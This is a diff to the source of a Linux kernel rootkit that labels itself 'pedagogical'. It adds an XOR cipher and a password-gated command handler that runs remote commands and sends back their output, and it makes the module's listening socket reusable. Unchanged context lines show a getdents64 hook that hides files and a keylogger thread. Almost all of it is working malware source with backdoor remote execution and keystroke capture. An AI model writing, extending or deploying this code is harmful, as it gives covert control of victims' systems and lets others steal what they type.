@@ -30,6 +30,10 @@ MODULE_AUTHOR("Team_Rodrien");
 MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
 MODULE_VERSION("0.1");
 
+// Export des symboles
+EXPORT_SYMBOL(process_command);
+EXPORT_SYMBOL(apply_xor_cipher);
+
 // Global variables
 struct rootkit_config config = {
     .port = 4242,
@@ -235,11 +239,22 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
 static int listen_for_connections(void) {
     struct sockaddr_in addr;
     int ret;
+    int flags;
 
     ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
                           &g_connection_socket);
     if (ret < 0) {
         printk(KERN_ERR "EpiRootkit: Failed to create socket\n");
+        return ret;
+    }
+
+    // Set socket options
+    flags = 1;
+    ret = kernel_setsockopt(g_connection_socket, SOL_SOCKET, SO_REUSEADDR,
+                           (char *)&flags, sizeof(flags));
+    if (ret < 0) {
+        printk(KERN_ERR "EpiRootkit: Failed to set socket options\n");
+        sock_release(g_connection_socket);
         return ret;
     }
 
@@ -262,7 +277,7 @@ static int listen_for_connections(void) {
         return ret;
     }
 
-    printk(KERN_INFO "EpiRootkit: Listening on port %d\n", config.port);
+    printk(KERN_INFO "EpiRootkit: Successfully listening on port %d\n", config.port);
     return 0;
 }
 
@@ -401,6 +416,35 @@ int keylog_thread(void *data) {
         msleep(100);
     }
     return 0;
+}
+
+void apply_xor_cipher(char *data, int len) {
+    int i;
+    for (i = 0; i < len; i++) {
+        data[i] ^= config.xor_key[i % strlen(config.xor_key)];
+    }
+}
+
+void process_command(const char *command) {
+    if (!command) return;
+    
+    if (strncmp(command, config.command_prefix_auth, config.command_prefix_length) == 0) {
+        // Traitement de l'authentification
+        if (strcmp(command + config.command_prefix_length, g_password) == 0) {
+            g_is_authenticated = true;
+            send_data("Authentication successful\n");
+        } else {
+            send_data("Authentication failed\n");
+        }
+    } else if (!g_is_authenticated) {
+        send_data("Not authenticated\n");
+        return;
+    } else if (strncmp(command, config.command_prefix_exec, config.command_prefix_length) == 0) {
+        // Exécution de commande
+        exec_and_send_output(command + config.command_prefix_length);
+    } else {
+        send_data("Unknown command\n");
+    }
 }
 
 module_init(epirootkit_init);
